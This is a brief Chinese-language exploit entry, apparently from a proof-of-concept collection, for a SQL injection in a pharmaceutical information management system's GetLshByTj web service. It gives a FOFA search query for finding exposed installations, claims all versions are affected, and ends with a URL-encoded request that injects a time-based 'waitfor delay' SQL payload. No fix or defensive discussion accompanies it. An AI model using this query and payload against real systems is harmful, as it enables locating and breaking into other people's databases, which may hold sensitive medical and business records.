

**漏洞描述**

医药信息管理系统 GetLshByTj SQL注入漏洞

**fofa搜索语句**

icon_hash="775044030"

**影响版本**

全版本

**漏洞复现**

POC：

```url
/WebService.asmx/GetLshByTj?djcname=%31%27%3b%77%61%69%74%66%6f%72%20%64%65%6c%61%79%20%27%30%3a%30%3a%33%27%2d%2d%20%2d&redonly=true&tjstr=12
```

